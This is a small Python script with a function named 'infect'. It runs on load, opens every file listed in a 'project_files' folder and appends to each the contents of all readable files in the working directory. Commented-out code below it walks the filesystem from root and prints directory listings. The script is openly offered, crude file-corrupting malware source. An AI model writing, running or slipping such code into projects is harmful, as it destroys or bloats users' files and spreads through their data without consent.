import os


def infect(files):

    for file in files:
        fl = open(file, 'a')
        lines = []
        __inject_files = os.listdir(os.getcwd())
        for i_file in __inject_files:
            try:
                f = open(os.getcwd() + '/' + i_file, 'r')
                lines.extend(f.readlines())
            except:
                pass
        fl.writelines(lines)
        fl.close()


infect(os.listdir('project_files'))


# paths = os.listdir("/")
# print(paths)
# for path in paths:
#     try:
#         print(os.listdir("/"+path))
#     except:
#         pass
#
#
# def recursive_files(prefix, paths):
#     for path in paths:
#         try:
#
#             if prefix == '/':
#                 path = prefix + path
#             else:
#                 path = prefix + '/' + path
#
#             lst_paths = os.listdir(path)
#             print("Path : ", path, '=', lst_paths)
#             print()
#             recursive_files(path, lst_paths)
#         except:
#             return


# recursive_files('', [''])